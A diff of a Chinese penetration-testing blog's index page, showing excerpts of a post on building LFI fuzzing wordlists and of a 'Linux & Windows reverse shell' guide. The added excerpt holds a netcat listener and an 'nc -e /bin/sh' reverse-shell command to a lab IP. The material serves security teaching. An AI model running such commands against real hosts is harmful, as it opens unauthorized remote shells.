@@ -292,164 +292,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2019/04/01/LFI-Fuzz/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="p1n3">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="不如茶酒伴">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/01/LFI-Fuzz/" itemprop="url">记一次LFI-Fuzz字典构造</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-02T05:32:53+08:00">
-                四月 02,2019
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="Fuzz字典构造的必要性"><a href="#Fuzz字典构造的必要性" class="headerlink" title="Fuzz字典构造的必要性"></a>Fuzz字典构造的必要性</h2><p>当遇到一处文件包含漏洞时，一般操作大致如下</p>
-<blockquote>
-<ul>
-<li>包含源码进行代码审计</li>
-<li>包含文件(如日志)进行GetShell</li>
-<li>包含配置文件获得敏感信息</li>
-</ul>
-</blockquote>
-<p>对于后两个而言，手动一个个的去进行测试无疑是不够优雅的<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/01/LFI-Fuzz/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </p></div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <div>
-      
-    </div>
-    
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2019/03/26/reverse-shell/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -469,7 +311,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/03/26/reverse-shell/" itemprop="url">Linux花式弹shell指南</a></h1>
+                <a class="post-title-link" href="/2019/03/26/reverse-shell/" itemprop="url">Linux&Win花式弹shell指南</a></h1>
         
 
         <div class="post-meta">
@@ -542,7 +384,9 @@
 
       
         
-          <h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2>
+          <h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.220.140 6666</span><br></pre></td></tr></table></figure>
+<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/03/26/reverse-shell/#more" rel="contents">
@@ -1025,6 +869,164 @@
         
       
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <div>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2019/03/22/LFI-Fuzz/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="p1n3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不如茶酒伴">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/22/LFI-Fuzz/" itemprop="url">记一次LFI-Fuzz字典构造</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-23T07:32:53+08:00">
+                三月 23,2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Fuzz字典构造的必要性"><a href="#Fuzz字典构造的必要性" class="headerlink" title="Fuzz字典构造的必要性"></a>Fuzz字典构造的必要性</h2><p>当遇到一处文件包含漏洞时，一般操作大致如下</p>
+<blockquote>
+<ul>
+<li>包含源码进行代码审计</li>
+<li>包含文件(如日志)进行GetShell</li>
+<li>包含配置文件获得敏感信息</li>
+</ul>
+</blockquote>
+<p>对于后两个而言，手动一个个的去进行测试无疑是不够优雅的<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/22/LFI-Fuzz/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </p></div>
     
     
     
